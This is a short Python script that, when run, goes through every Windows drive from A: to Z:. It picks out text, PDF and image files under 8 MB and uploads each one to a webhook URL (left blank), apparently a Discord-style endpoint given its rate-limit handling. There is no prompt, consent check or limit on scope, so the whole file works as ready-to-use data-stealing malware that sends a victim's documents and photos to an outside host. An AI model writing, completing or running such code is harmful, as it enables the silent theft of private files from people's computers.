import os
import requests
import time
WEBHOOK_URL = '' 
def check_file(file_path):
    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif']
    max_size_mb = 8
    if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
        print(f"Skipping file {file_path} - invalid file type")
        return False
    elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
        print(f"Skipping file {file_path} - file size too large")
        return False
    elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
        print(f"Skipping file {file_path} - file requires admin privileges")
        return False
    else:
        return True
def upload_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 429:
                print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                time.sleep(response.json()['retry_after']/1000)
                upload_file(file_path)  # Retry the upload after waiting
            elif response.status_code != 200:
                print(f"Failed to upload file {file_path} - error {response.status_code}")
            else:
                print(f"Successfully uploaded file {file_path}")
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")
def search_files(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if check_file(file_path):
                upload_file(file_path)
drives = ['%s:' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]
for drive in drives:
    search_files(drive)
